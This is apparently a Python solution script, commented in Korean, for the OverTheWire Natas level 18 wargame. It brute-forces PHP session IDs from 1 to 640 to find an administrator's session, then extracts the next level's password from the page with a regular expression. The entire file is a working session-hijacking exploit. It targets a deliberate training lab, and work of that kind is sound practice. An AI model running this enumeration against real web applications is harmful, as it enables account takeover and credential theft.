import requests
import re

url = "http://natas18.natas.labs.overthewire.org/"
#본인이 사용한 나타스18 비밀번호 아래 변수에 대입하여 사용
natas18_cred = ""

s = requests.Session()
s.auth = ("natas18", natas18_cred)

# 세션의 최대값이 640이라고 했으니 상수로 선언 
MAX_VAL = 640
boundary = "=" * 60
  
# for문을 통해 세션 브루트 포스를 반복문을 통해 실행(세션값에 페이로드가 숫자만 대입하는 거라 비교적 간단함.)  
for session_value in range(1, MAX_VAL+1):
  payload = {"PHPSESSID": str(session_value)}
    
  # 쿠키값에 해당 페이로드가 요청으로 들어감
  response = s.get(url, cookies=payload)
    
  # 소스코드를 보면 아래와 같이 You are an admin이라는 문장이 있다면 제대로된 세션이므로 이때 세션값을 출력하고 반복을 멈춤  
  if "You are an admin" in response.text:
    print(boundary)
    print(f"[+]admin에 해당하는 세션값 ===> {session_value}")
    print(boundary)
    
    # 응답에서 re모듈로 정규식을 통해 32자의 비밀번호 추출  
    pass_str = re.search(r"Password:\s*(\w+)", response.text)
    
    # 해당 natas19의 비밀번호 최종 출력
    if pass_str:  
      print(f"[+]natas19의 비밀번호 ===> {pass_str.group(1)}")
      print(boundary)
    
    # 정규식을 통해 비밀번호를 추출하지 못한 경우, 응답 페이지 html코드 전체를 출력하여 직접 찾도록 처리
    else:
      print("[-]비밀번호를 찾지 못했습니다, 아래 출력창에서 전체 응답을 보고 직접 확인하세요")
      print(response.text) 
      print(boundary)
    
    break

# admin 세션을 아예 못 찾았을 경우, MAX_VAL을 늘리거나 문제를 다시 보고 익스플로잇 시도 
else:
  print(f"[-]admin session을 찾지 못했으니 MAX_VAL의 범위나 조건을 다시 확인해주세요.")


  
  


